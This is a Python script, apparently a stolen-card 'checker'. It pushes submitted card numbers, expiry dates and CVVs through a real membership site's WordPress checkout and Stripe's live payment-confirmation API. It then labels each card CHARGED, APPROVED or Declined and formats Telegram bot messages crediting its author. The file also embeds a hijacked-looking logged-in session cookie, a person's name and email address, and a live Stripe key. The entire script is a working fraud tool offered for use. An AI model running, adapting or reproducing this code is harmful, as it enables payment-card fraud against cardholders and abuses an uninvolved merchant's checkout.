import requests,time

def luhn_check(card_number):
    digits = [int(digit) for digit in card_number.replace(" ", "")][::-1]
    checksum = 0
    for i, digit in enumerate(digits):
	    if i % 2 == 1:
	        digit *= 2
	        if digit > 9:
		          	digit -= 9
	    checksum += digit
    return checksum % 10 == 0

def process_card(card_data):
    start_time = time.time()
    session = requests.Session()
    try:
	    cc, mes, ano, cvv = map(str.strip, card_data.split('|'))
	    if not luhn_check(cc): return f"{card_data}","Faild in luhn check",False,"5",None
    except Exception:
    	return f"{card_data}","Bad Format",False,"5",None
    card = card_data
    last4 = cc[-4:]
    if cc.startswith("4"):
        card_brand = "Visa"
    elif cc.startswith("5"):
        card_brand = "MasterCard"
    else:
    	card_brand = "None"
    if mes.startswith("0"):
    	mes = mes.lstrip("0")
#——————————————————————#
    headers = {
    'authority': 'mycorrhizas.org',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryC8tZNd6Vr6JsGnQZ',
    'cookie': 'wordpress_sec_1eca930428ee9df8af6bdb65c698e531=uduru28%40gmail.com%7C1695113210%7CmlNGIzwDM7BzyrnU6C1Dv0DS76jmB61E0Rc7Qk1xXQV%7C388d24812ce18fe4441673c7c998c4a9ef45aca6e863e6facd5e12616d9525ce; cookieyes-consent=consentid:VmEwTG9XTDQwRnVSOGh6bzdyRFk2NlVNNG1aZkxuN24,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes; wordpress_logged_in_1eca930428ee9df8af6bdb65c698e531=uduru28%40gmail.com%7C1695113210%7CmlNGIzwDM7BzyrnU6C1Dv0DS76jmB61E0Rc7Qk1xXQV%7C55d0e15e5bd72cb6a38ee3ccc6b53493342750dc2c889396506b5a894a27d8da; __stripe_mid=0afdec37-a1d1-46a7-b05f-63501a979540e84de4; __stripe_sid=f09fea5e-1fcc-4655-94cf-ed4f9fbec921febf95',
    'origin': 'https://mycorrhizas.org',
    'referer': 'https://mycorrhizas.org/register/individual/?action=checkout&txn=qn',
    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; Infinix X657B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}


    data = '------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="mepr_transaction_id"\r\n\r\n959\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="address_required"\r\n\r\n1\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="card-first-name"\r\n\r\nMostafa\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="card-last-name"\r\n\r\nAshry\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="card-address-one"\r\n\r\nno\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="card-address-two"\r\n\r\nno\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="card-address-city"\r\n\r\nNew York\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="card-address-country"\r\n\r\nUS\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="card-address-state"\r\n\r\nNY\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="card-address-zip"\r\n\r\n10080\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="ak_bib"\r\n\r\n\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="ak_bfs"\r\n\r\n1694940437821\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="ak_bkpc"\r\n\r\n0\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="ak_bkp"\r\n\r\n\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="ak_bmc"\r\n\r\n17;\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="ak_bmcc"\r\n\r\n1\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="ak_bmk"\r\n\r\n\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="ak_bck"\r\n\r\n\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="ak_bmmc"\r\n\r\n0\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="ak_btmc"\r\n\r\n2\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="ak_bsc"\r\n\r\n3\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="ak_bte"\r\n\r\n343;79,8073;\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="ak_btec"\r\n\r\n2\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="ak_bmm"\r\n\r\n\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="ak_bib"\r\n\r\n\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="ak_bfs"\r\n\r\n1694940468697\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="ak_bkpc"\r\n\r\n0\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="ak_bkp"\r\n\r\n\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="ak_bmc"\r\n\r\n17;5,30924;\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="ak_bmcc"\r\n\r\n2\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="ak_bmk"\r\n\r\n\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="ak_bck"\r\n\r\n\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="ak_bmmc"\r\n\r\n0\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="ak_btmc"\r\n\r\n6\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="ak_bsc"\r\n\r\n5\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="ak_bte"\r\n\r\n343;79,8073;1191,8288;140,435;568,871;359,219;334,322;269,397;45,17509;\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="ak_btec"\r\n\r\n9\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="ak_bmm"\r\n\r\n\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="action"\r\n\r\nmepr_stripe_confirm_payment\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ\r\nContent-Disposition: form-data; name="mepr_current_url"\r\n\r\nhttps://mycorrhizas.org/register/individual/?action=checkout&txn=qn#mepr_jump\r\n------WebKitFormBoundaryC8tZNd6Vr6JsGnQZ--\r\n'
    
    response = session.post('https://mycorrhizas.org/wp-admin/admin-ajax.php', headers=headers, data=data)
#———–———–———–———–———–———#
    try:
        cs = (response.json()["client_secret"])
        parts = cs.split("_secret_")
        first_value = parts[0]
#———–———–———–———–———–———#
        headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; Infinix X657B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
}

        data = f'return_url=https%3A%2F%2Fmycorrhizas.org%2Fmepr%2Fnotify%2Fo3cl23-6ym%2Freturn%3Ftxn_id%3D959%26redirect_to%3Dhttps%253A%252F%252Fmycorrhizas.org%252Fthank-you%252F%253Fmembership%253Dindividual%2526membership_id%253D433%2526transaction_id%253D959&payment_method_data[billing_details][address][line1]=no&payment_method_data[billing_details][address][line2]=no&payment_method_data[billing_details][address][city]=New+York&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][state]=NY&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[billing_details][email]=uduru28%40gmail.com&payment_method_data[billing_details][name]=Mostafa+Ashry&payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_year]={ano}&payment_method_data[card][exp_month]={mes}&payment_method_data[payment_user_agent]=stripe.js%2F9c6b247bbb%3B+stripe-js-v3%2F9c6b247bbb%3B+payment-element%3B+deferred-intent&payment_method_data[time_on_page]=12345&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&expected_payment_method_type=card&client_context[currency]=usd&client_context[mode]=payment&client_context[payment_method_types][0]=card&use_stripe_sdk=true&key=pk_live_517SxEYDDDZ30A5owFJWqNgaYCekO1XHbQUTJwbwigBS31ZEoEuWllq2ZVVo0H3tw29rcH5pGi8wgtLacRHgrJiyy00a6PbeY2p&_stripe_version=2022-11-15&client_secret={cs}'
#———–———–———–———–———–———#
        response2 = session.post(
    f'https://api.stripe.com/v1/payment_intents/{first_value}/confirm',
    headers=headers,
    data=data
    )
        print(response2.text)
    except Exception:
    	end_time = time.time()
    	execution_time = end_time - start_time
    	msg_text = "Your card was declined."
    	bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs: Declined ❌
⌬ ʀᴇsᴘᴏɴsᴇ: {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ: Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══     """
    	return f"{card_data}",f"{msg_text}",False,5,f"{bot_msg}"
#——————————————————————#
    response2_text = response2.text
    end_time = time.time()
    execution_time = end_time - start_time
    print(response2_text)
    send_by_bot = False
    msg_text = "Unkown Response."
    add_num = 5
    bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs: Declined ❌
⌬ ʀᴇsᴘᴏɴsᴇ: {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ: Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══
	{response2.text}     """
    if "Your card was declined." in response2_text:
        msg_text = "Your card was declined."
        bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs: Declined ❌
⌬ ʀᴇsᴘᴏɴsᴇ: {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ: Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══     """
    elif "incorrect_number" in response2_text:
        msg_text = "Your card number is incorrect."
        bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs: Declined ❌
⌬ ʀᴇsᴘᴏɴsᴇ: {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ: Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══    """
    elif "Your card's expiration month is invalid." in response2_text:
        msg_text = "Your card's expiration month is invalid."
        bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs: Declined ❌
⌬ ʀᴇsᴘᴏɴsᴇ: {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ: Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══     """
    elif "incorrect_zip" in response2_text:
        msg_text = "incorrect_zip"
        bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs: Declined ❌
⌬ ʀᴇsᴘᴏɴsᴇ: {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ: Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══      """
	
    elif "Error updating default payment method. Your card was declined." in response2_text:
        msg_text = "DO NOT HONOR"
        bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ:{card}
⌬ sᴛᴀᴛᴜs: Declined ❌
⌬ ʀᴇsᴘᴏɴsᴇ: {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ: Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══    """
#——————————————————————#
    elif "Your card's security code is incorrect" in response2_text or "security code is invalid." in response2_text or "Your card's security code is incorrect" in response2_text or "security code is invalid." in response2_text or "incorrect_cvc" in response2_text:
        msg_text = "Your card's security code is incorrect."
        send_by_bot = True
        bot_msg = f"""	
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs : APPRPVED ➜ CNN ✅
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══    """
        add_num = 4
#——————————————————————#
    elif "Your card has insufficient funds." in response2_text:
    	msg_text = "Your card has insufficient funds."
    	send_by_bot = True
    	bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs : APPRPVED ✅
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══     """
    	add_num = 3
    	
    elif "succeeded" in response2_text or "Membership Confirmation" in response2_text or "Thank you for your support!" in response2_text or "Thank you for your donation" in response2_text or "/wishlist-member/?reg=" in response2_text or "Thank You" in response2_text:
    	msg_text = "succeeded"
    	send_by_bot = True
    	
    	bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs : CHARGED ✅
⌬ ʀᴇsᴘᴏɴsᴇ : succeeded
⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══    """
    	add_num = 1
    	
    elif "transaction_not_allowed" in response2_text:
    	msg_text = "transaction_not_allowed"
    	send_by_bot = True
    	bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs : APPRPVED ✅
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══     """
    	add_num = 2
    	
    elif "Your card is not supported." in response2_text:
    	msg_text = "Your card is not supported."
    	send_by_bot = True
    	bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs : APPRPVED ✅
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══    """
    	add_num = 2
    	
    elif """"cvc_check": "pass"'""" in response2_text:
    	msg_text = """"cvc_check": "pass"'"""
    	send_by_bot = True
    	bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs : APPRPVED ✅
⌬ ʀᴇsᴘᴏɴsᴇ : cvc_check:pass
⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══     """
    	add_num = 2
    	
    elif "Your card does not support this type of purchase." in response2_text:
    	msg_text = "Your card does not support this type of purchase."
    	send_by_bot = True
    	add_num = 2
    	bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs : APPRPVED ✅
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══      """
    elif """"next_action": {
		"type": "use_stripe_sdk",""" in response2_text or "stripe_3ds2_fingerprint" in response2_text:
    	add_num = 6
    	msg_text = "OTP"
    	bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs : OTP ❌
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══
	
	"""
    else:
    	bot_msg = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 </a>  ]═════
⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs : Declined ❌
⌬ ʀᴇsᴘᴏɴsᴇ : Unkwon Response
⌬ ɢᴀᴛᴇᴡᴀʏ : Stripe
⌬ ᴛɪᴍᴇ: {execution_time:.2f}
bin_info
══『 𝗕𝗢𝗧 𝗕𝗬-<a href='tg://user?id=5894339732'>𝐌𝐎𝐒𝐓𝐀𝐅𝐀</a> 』══      """
    	print(response2.text)
    	return f"{card_data}","Unkwon Response.",send_by_bot,5,f"{bot_msg}"
    	
    return f"{card_data}",f"{msg_text}",send_by_bot,add_num,f"{bot_msg}"
    
    
